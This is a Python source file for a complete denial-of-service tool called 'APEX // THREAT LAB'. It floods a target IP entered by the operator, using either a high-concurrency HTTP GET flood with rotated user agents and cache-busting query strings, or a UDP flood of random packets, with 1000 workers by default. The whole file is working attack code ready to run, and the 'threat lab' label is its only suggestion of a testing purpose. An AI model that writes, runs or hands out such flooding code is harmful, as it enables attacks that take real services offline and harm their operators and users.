import asyncio
import socket
import random
import os
import time
import sys
from dataclasses import dataclass
from typing import List, Optional
 
# Use uvloop if available for significantly faster event loop performance
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass
 
@dataclass
class TargetConfig:
    ip: str
    port: int
    mode: str
    concurrency: int
    timeout: float = 2.0
 
class ApexEngine:
    def __init__(self):
        self.is_running = False
        self.stats = {"sent": 0, "errors": 0}
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
        ]
        self.http_headers = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1",
            "Cache-Control: max-age=0"
        ]
 
    def _generate_l7_payload(self, ip: str) -> bytes:
        ua = random.choice(self.user_agents)
        headers = "\r\n".join([f"{h}: {random.randint(1,1000)}" if "random" in h else h for h in self.http_headers])
        payload = (
            f"GET /?{os.urandom(8).hex()} HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            f"User-Agent: {ua}\r\n"
            f"{headers}\r\n\r\n"
        )
        return payload.encode()
 
    async def l7_worker(self, config: TargetConfig):
        """Asynchronous HTTP flood using non-blocking socket connection"""
        while self.is_running:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(config.ip, config.port), 
                    timeout=config.timeout
                )
                writer.write(self._generate_l7_payload(config.ip))
                await writer.drain()
                
                # We don't wait for the response to maximize throughput (Half-open style)
                writer.close()
                await writer.wait_closed()
                self.stats["sent"] += 1
            except (asyncio.TimeoutError, socket.gaierror, ConnectionRefusedError, OSError):
                self.stats["errors"] += 1
            except Exception:
                self.stats["errors"] += 1
 
    async def l4_worker(self, config: TargetConfig):
        """Volumetric UDP flood utilizing pre-allocated random buffers to bypass Python's runtime overhead"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Pre-generate payloads to avoid runtime overhead in the loop
        payloads = [os.urandom(1024) for _ in range(10)]
        while self.is_running:
            try:
                sock.sendto(random.choice(payloads), (config.ip, config.port))
                self.stats["sent"] += 1
            except (OSError, socket.gaierror):
                self.stats["errors"] += 1
            # Yield control to the event loop
            await asyncio.sleep(0)
 
    async def orchestrator(self, config: TargetConfig):
        self.is_running = True
        tasks = []
        
        # Distribute load across workers
        for _ in range(config.concurrency):
            if config.mode == "L7":
                tasks.append(asyncio.create_task(self.l7_worker(config)))
            else:
                tasks.append(asyncio.create_task(self.l4_worker(config)))
 
        # Monitoring loop
        try:
            while self.is_running:
                print(f"\r[!] Traffic: {self.stats['sent']} pkts | Errors: {self.stats['errors']}", end="")
                sys.stdout.flush()
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            self.is_running = False
 
async def main():
    print("--- APEX // THREAT LAB :: HIGH-CONCURRENCY ENGINE ---")
    ip = input("🌐 Target IP: ")
    port = int(input("🔌 Target Port (default 80): ") or 80)
    mode = input("⚡ Vector (L4/L7): ").upper()
    conc = int(input("⚙️ Concurrency (default 1000): ") or 1000)
    
    config = TargetConfig(ip=ip, port=port, mode=mode, concurrency=conc)
    engine = ApexEngine()
    
    try:
        await engine.orchestrator(config)
    except KeyboardInterrupt:
        print("\n🛑 Execution halted by operator.")
 
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass